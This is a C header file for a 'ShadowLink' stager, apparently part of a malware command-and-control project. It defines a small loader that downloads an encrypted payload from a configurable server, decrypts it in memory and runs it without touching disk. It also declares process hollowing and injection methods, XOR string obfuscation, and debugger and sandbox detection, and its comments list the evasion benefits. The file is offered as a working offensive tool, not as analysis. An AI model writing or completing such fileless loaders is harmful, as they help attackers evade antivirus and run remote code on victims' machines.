/*
 * ShadowLink Stager/Loader
 * Phase 11: Fileless Execution
 * 
 * A small (~10KB) executable that:
 * 1. Downloads the main agent from server
 * 2. Decrypts it in memory
 * 3. Executes directly without touching disk
 * 
 * Evasion benefits:
 * - Only stager on disk (very small, less signatures)
 * - Main payload never touches disk
 * - Harder to analyze full capability
 * - Payload can be updated server-side
 */

#ifndef STAGER_H
#define STAGER_H

#include <windows.h>

// Configuration
#define STAGER_USER_AGENT L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

// Default server (can be changed at compile time)
#ifndef PAYLOAD_HOST
#define PAYLOAD_HOST L"192.168.160.1"
#endif

#ifndef PAYLOAD_PORT
#define PAYLOAD_PORT 443
#endif

#ifndef PAYLOAD_PATH
#define PAYLOAD_PATH L"/api/v1/payload"
#endif

// XOR key for string obfuscation
#define STAGER_XOR_KEY 0x5A

// Execution methods
typedef enum {
    EXEC_LOCAL,          // Execute in current process (default)
    EXEC_SPAWN,          // Spawn new process and inject
    EXEC_HOLLOW,         // Process hollowing
    EXEC_THREAD          // Create new thread
} EXECUTION_METHOD;

// Stager configuration (can be embedded or downloaded)
typedef struct _STAGER_CONFIG {
    wchar_t     wszHost[256];
    DWORD       dwPort;
    wchar_t     wszPath[256];
    BYTE        aesKey[32];
    EXECUTION_METHOD execMethod;
    BOOL        bUseProxy;
    BOOL        bSslVerify;
    DWORD       dwRetryCount;
    DWORD       dwRetryDelay;
} STAGER_CONFIG, *PSTAGER_CONFIG;

// Function prototypes
int stager_init(PSTAGER_CONFIG pConfig);
int stager_download_payload(PSTAGER_CONFIG pConfig, BYTE **ppPayload, DWORD *pdwSize);
int stager_execute_payload(BYTE *pPayload, DWORD dwSize, EXECUTION_METHOD method);
void stager_cleanup(void);

// PE execution methods
int execute_pe_in_memory(BYTE *pPE, DWORD dwSize);
int execute_shellcode(BYTE *pShellcode, DWORD dwSize);
int hollowing_execute(const char *target_process, BYTE *pPE, DWORD dwSize);

// Utility functions
void xor_decrypt_buffer(BYTE *data, DWORD size, BYTE key);
BOOL is_debugger_attached(void);
BOOL is_sandbox_environment(void);

#endif // STAGER_H
